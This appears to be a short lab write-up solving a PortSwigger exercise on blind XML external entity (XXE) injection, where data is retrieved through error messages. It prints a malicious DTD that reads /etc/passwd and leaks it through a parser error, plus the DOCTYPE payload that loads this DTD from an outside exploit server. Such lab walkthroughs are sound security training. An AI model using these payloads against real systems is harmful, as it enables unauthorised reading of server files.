## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5b7b4c09-68f3-4c53-bcee-3489eea64ab6)

## Solution :

Create a malicious DTD -
On the exploit server create a malicious DTD file with the following contents,

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Host this malicious.dtd file in our exploit server.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9745ae1e-ae6b-49f4-ace4-480576e6cbc2)

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0c12f1d5-b222-4aa0-83f0-6dd05866ea68)

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9518e2b0-917d-4ff8-b2b0-47890355c48d)

Insert the following external entity definition in between the XML declaration and the stockCheck element:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c602fe7c-3a02-4cfc-ab7f-ddf9d9455254)

You should see an error message containing the contents of the /etc/passwd file.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9c58d17e-c89a-414f-b7e9-3970b302d71e)

Lab sloved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7ea1fb05-3d40-43f9-88c0-4847ec317aab)


